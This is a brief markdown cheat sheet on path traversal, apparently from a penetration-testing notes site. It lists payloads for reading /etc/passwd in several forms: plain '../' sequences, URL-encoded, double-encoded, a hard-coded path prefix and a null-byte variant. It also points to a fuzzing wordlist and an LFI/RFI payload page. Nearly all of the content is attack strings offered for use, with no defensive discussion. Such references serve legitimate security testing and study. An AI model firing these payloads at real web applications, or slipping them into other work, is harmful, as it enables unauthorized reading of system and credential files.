---
title: Path Traversal
description: Vulnerability allowing attacker to access files and directories of a system
---
## Exploit
### Basic
```bash
../../../etc/passwd
```

### Encoded
```bash
/%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### Double encoded
```bash
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```
### Hard-coded path
```bash
/var/www/images/../../../etc/passwd
```

### Null byte
Append `%00`,  character following null byte will be ignored
```bash
../../../../../passwd%00
```

### Fuzzing
Fuzz using `LFI-Jhaddix.txt` wordlist

## Links
-  [LFI/RFI payloads ](https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/)